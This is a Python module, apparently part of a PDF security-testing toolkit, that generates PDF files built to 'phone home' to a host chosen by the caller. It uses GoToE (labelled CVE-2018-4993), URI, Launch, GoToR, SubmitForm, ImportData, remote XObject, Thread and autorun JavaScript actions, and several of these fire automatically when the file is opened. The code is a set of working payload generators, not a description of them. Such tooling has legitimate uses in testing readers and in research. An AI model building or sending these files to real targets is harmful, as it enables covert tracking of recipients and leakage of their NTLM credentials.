"""Native PDF action phone-home generators."""

from __future__ import annotations

import base64
import bz2
import os
import re
import zlib

from lib.pdf.obfuscation import ensure_scheme

def write_gotoe_unc(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R

   /AA <<
	   /O <<
	      /F (''' + host + ''')
		  /D [ 0 /Fit]
		  /S /GoToE
		  >>

	   >>

	   /Parent 2 0 R
	   /Resources <<
			/Font <<
				/F1 <<
					/Type /Font
					/Subtype /Type1
					/BaseFont /Helvetica
					>>
				  >>
				>>
>>
endobj


4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(PDF Document) Tj
ET
endstream
endobj


trailer
<<
	/Root 1 0 R
>>

%%EOF
''')


def write_gotoe_https(filename, host):
    """CVE-2018-4993 GoToE with HTTPS URL (scheme callback)."""
    write_gotoe_unc(filename, ensure_scheme(host))


def write_uri_action(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Open true
                 /A 5 0 R
                 /H /N
                 /Rect [0 0 595 842]
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'uri'     ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /URI
     /URI (''' + host + '''/test5)
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000629 00000 n
0000000749 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
854
%%EOF
''')


def write_launch_url(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Open true
                 /A 5 0 R
                 /H /N
                 /Rect [0 0 595 842]
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'launch'  ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /Launch
     /F << /Type /FileSpec /F (''' + host + '''/test6.pdf) /V true /FS /URL >>
     /NewWindow false
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000629 00000 n
0000000749 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
922
%%EOF
''')


def write_gotor_remote(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Open true
                 /A 5 0 R
                 /H /N
                 /Rect [0 0 595 842]
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'gotor'   ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /GoToR
     /F << /Type /FileSpec /F ('''+host+'''/test7.pdf) /V true /FS /URL >>
     /NewWindow false
     /D [0 /Fit]
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000629 00000 n
0000000749 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
937
%%EOF
''')


def write_submitform_html(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction 5 0 R
     /AcroForm << /Fields [<< /Type /Annot /Subtype /Widget /FT /Tx /T (a) /V (b) /Ff 0 >>] >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'form'    ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /SubmitForm
     /F << /Type /FileSpec /F ('''+host+'''/test8.pdf) /V true /FS /URL >>
     /Flags 4 % SubmitHTML
   % /Flags 32 % SubmitXFDF
   % /Flags 256 % SubmitPDF
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000187 00000 n
0000000288 00000 n
0000000553 00000 n
0000000673 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
908
%%EOF
''')


def write_import_data(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /AcroForm << /Fields [<< /Type /Annot /Subtype /Widget /FT /Tx /T (a) /V (b) /Ff 0 >>] >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Open true
                 /A 5 0 R
                 /H /N
                 /Rect [0 0 595 842]
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'data'    ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /ImportData
     /F << /Type /FileSpec /F ('''+host+'''/test9.pdf) /V true /FS /URL >>
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000164 00000 n
0000000265 00000 n
0000000724 00000 n
0000000844 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
997
%%EOF
''')


def write_gotoe_javascript_uri(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R

   /AA <<
	   /O <<
	      /F (javascript:new Image().src="''' + host + '''/test16")
		  /D [ 0 /Fit]
		  /S /GoToE
		  >>

	   >>

	   /Parent 2 0 R
	   /Resources <<
			/Font <<
				/F1 <<
					/Type /Font
					/Subtype /Type1
					/BaseFont /Helvetica
					>>
				  >>
				>>
>>
endobj


4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(GotoE JS Test) Tj
ET
endstream
endobj


trailer
<<
	/Root 1 0 R
>>

%%EOF
''')


def write_uri_paren_injection(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Rect [0 0 595 842]
                 /A << /S /URI /URI (blah) >>
                 /A << /S /URI /URI (''' + host + '''/test28) /Type /Action >>
                 /F 0
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'uri-hijack'  ) Tj
  ET
endstream
endobj

xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000790 00000 n
trailer
  << /Root 1 0 R
     /Size 5
  >>
startxref
910
%%EOF
''')


def write_xobject_remote_url(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
         /XObject << /Im0 5 0 R >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'xobj-stream' ) Tj
  ET
  /Im0 Do
endstream
endobj

5 0 obj
  << /Type /XObject
     /Subtype /Image
     /Width 1
     /Height 1
     /BitsPerComponent 8
     /ColorSpace /DeviceRGB
     /FFilter /DCTDecode
     /F << /FS /URL /F (''' + host + '''/test30) >>
     /Length 0
  >>
stream
endstream
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000600 00000 n
0000000750 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
1000
%%EOF
''')


def write_thread_remote_filespec(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction 5 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'thread'      ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /Thread
     /F << /Type /FileSpec /F (''' + host + '''/test31.pdf) /V true /FS /URL >>
     /D 0
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000080 00000 n
0000000181 00000 n
0000000450 00000 n
0000000570 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
800
%%EOF
''')


def write_launch_print_fetch(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction 5 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'launch-print') Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /Launch
     /F << /Type /FileSpec /F (''' + host + '''/test32.pdf) /V true /FS /URL >>
     /Win << /O /print >>
     /NewWindow false
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000080 00000 n
0000000181 00000 n
0000000450 00000 n
0000000570 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
830
%%EOF
''')


def write_names_javascript_trigger(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /Names << /JavaScript << /Names [(autorun) 5 0 R] >> >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'names-js'    ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /JavaScript
     /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test35"), cFS: "CHTTP"}))
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000120 00000 n
0000000221 00000 n
0000000490 00000 n
0000000610 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
800
%%EOF
''')


def write_pdfium_openaction_uri(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction << /S /URI /URI (''' + host + '''/test41-uri-nogesture) >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'uri-auto'    ) Tj
  ET
endstream
endobj

xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000120 00000 n
0000000221 00000 n
0000000490 00000 n
trailer
  << /Root 1 0 R
     /Size 5
  >>
startxref
610
%%EOF
''')
